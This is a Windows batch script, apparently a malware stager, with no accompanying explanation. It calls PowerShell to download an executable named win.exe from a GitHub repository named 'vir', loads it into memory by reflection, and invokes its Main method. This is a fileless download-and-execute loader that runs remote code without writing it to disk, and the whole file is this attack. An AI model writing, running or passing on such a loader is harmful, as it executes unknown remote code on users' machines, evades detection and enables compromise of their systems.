@echo off 
Powershell -command "$bytes = (Invoke-WebRequest 
\"https://github.com/redlobx/vir/raw/main/win.exe\").Content; $string = 
[System.Convert]::ToBase64String($bytes); $bytes = 
[System.Convert]::FromBase64String($string); $assembly = 
[System.Reflection.Assembly]::Load($bytes); $entryPointMethod = 
$assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 
'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, 
NonPublic'); $entryPointMethod.Invoke($null, (, [string[]] ('foo', 
'bar')))"